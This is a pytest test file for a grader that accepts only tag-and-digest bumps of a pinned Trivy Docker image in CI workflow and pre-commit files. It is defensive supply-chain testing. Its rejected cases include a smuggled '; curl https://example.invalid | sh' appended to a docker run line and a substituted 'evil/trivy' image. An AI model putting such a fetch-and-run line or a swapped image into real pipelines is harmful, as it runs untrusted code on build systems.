# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Ivan Pinatti
"""The image_ref_pin grammar: an image pinned by tag and digest inside a line.

rsync-crypt runs Trivy from its official image, `docker run` in workflow steps
and in pre-commit hook entries, pinned as `image:tag@sha256:<digest>` and
bumped in place by Renovate. The reference sits in the middle of a command, so
neither shell_image_pin (an assignment alone on its line) nor
docker_image_pin (a FROM or BASE_IMAGE ARG) reads it, and `version` would
accept any `name:tag` change on those executable surfaces.
"""

import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "src" / "pin_only.py"
sys.path.insert(0, str(ROOT / "src"))
# E402: the import has to follow the sys.path line above.
import pin_only  # noqa: E402

WORKFLOW = ".github/workflows/scan.yml"
HOOKS = ".pre-commit-config.yaml"

OLD = "docker.io/aquasec/trivy:0.74.0@sha256:" + "a" * 64
NEW = "docker.io/aquasec/trivy:0.76.1@sha256:" + "b" * 64

CONFIG = f"""\
allowed_paths:
  - {WORKFLOW}
  - {HOOKS}
rules:
  - path: .github/workflows/
    grammars: [image_ref_pin]
default_grammars: [image_ref_pin]
"""

RUN = f"            docker run --rm {OLD} image --exit-code 1 ."
QUOTED = f'          IMAGE: "{OLD}"'
BARE = "            docker run --rm docker.io/aquasec/trivy:0.74.0 image ."
HOOK = f"          {OLD} rootfs --exit-code 0 /scan"

FILES = {
    WORKFLOW: f"jobs:\n  scan:\n    steps:\n      - run: |\n{RUN}\n{QUOTED}\n{BARE}\n",
    HOOKS: f"repos:\n  - repo: local\n    hooks:\n      - entry: >-\n{HOOK}\n",
}


def _git(repo: Path, *args: str) -> str:
    # S603/S607: git from PATH, with arguments written here, in a throwaway
    # repository pytest created.
    return subprocess.run(
        [
            "git",
            "-C",
            str(repo),
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@users.noreply.github.com",
            *args,
        ],
        capture_output=True,
        text=True,
        check=True,
    ).stdout


def _grade(
    tmp_path: Path, path: str, old: str, new: str
) -> subprocess.CompletedProcess:
    """Commit FILES, replace one line in one file, and grade the real diff."""
    (tmp_path / "pin-only.yml").write_text(CONFIG)
    _git(tmp_path, "init", "-q")
    for name, text in FILES.items():
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text(text)
    _git(tmp_path, "add", ".")
    _git(tmp_path, "commit", "-q", "-m", "base")
    assert old in FILES[path]
    (tmp_path / path).write_text(FILES[path].replace(old, new, 1))
    diff = _git(tmp_path, "diff")
    # The grader proves a workflow's base by reading it whole from the
    # repository root, so the root holds the base, as main would.
    (tmp_path / path).write_text(FILES[path])
    return subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--config",
            str(tmp_path / "pin-only.yml"),
            "--repo-root",
            str(tmp_path),
        ],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


@pytest.mark.parametrize(
    ("path", "line"),
    [(WORKFLOW, RUN), (WORKFLOW, QUOTED), (HOOKS, HOOK)],
)
def test_accepts_a_bump_of_tag_and_digest(tmp_path, path, line):
    result = _grade(tmp_path, path, line, line.replace(OLD, NEW))
    assert result.returncode == 0, result.stdout


def test_accepts_a_digest_only_bump(tmp_path):
    new = "docker.io/aquasec/trivy:0.74.0@sha256:" + "c" * 64
    result = _grade(tmp_path, WORKFLOW, RUN, RUN.replace(OLD, new))
    assert result.returncode == 0, result.stdout


@pytest.mark.parametrize(
    ("old", "new"),
    [
        # Another image, or the same name under another registry.
        (RUN, RUN.replace("aquasec/trivy", "evil/trivy").replace(OLD[-64:], "b" * 64)),
        (RUN, RUN.replace("docker.io/", "ghcr.io/")),
        # The digest dropped, so the bump is no longer a pin.
        (RUN, RUN.replace(OLD, "docker.io/aquasec/trivy:0.76.1")),
        # Something else on the line changed with it.
        (RUN, RUN.replace(OLD, NEW).replace("--exit-code 1", "--exit-code 0")),
        (RUN, RUN.replace(OLD, NEW) + "; curl https://example.invalid | sh"),
        # A tag alone is not a pinned reference, so it stays structural.
        (BARE, BARE.replace("0.74.0", "0.76.1")),
    ],
)
def test_refuses_anything_but_the_pin(tmp_path, old, new):
    result = _grade(tmp_path, WORKFLOW, old, new)
    assert result.returncode == 1, result.stdout


@pytest.mark.parametrize(
    ("line", "reduced"),
    [
        (f"run {OLD} x", "run docker.io/aquasec/trivy:<version> x"),
        (f'"{OLD}"', '"docker.io/aquasec/trivy:<version>"'),
        (f"IMAGE={OLD}", "IMAGE=docker.io/aquasec/trivy:<version>"),
        # The tail of a longer word, a registry with a port, a short digest
        # and a digest running on into more characters are not references.
        (f"a:{OLD}", f"a:{OLD}"),
        (
            "localhost:5000/trivy:0.74.0@sha256:" + "a" * 64,
            "localhost:5000/trivy:0.74.0@sha256:" + "a" * 64,
        ),
        ("trivy:0.74.0@sha256:abc", "trivy:0.74.0@sha256:abc"),
        (OLD + "z", OLD + "z"),
    ],
)
def test_reduction(line, reduced):
    assert pin_only.GRAMMARS["image_ref_pin"](line, None) == reduced
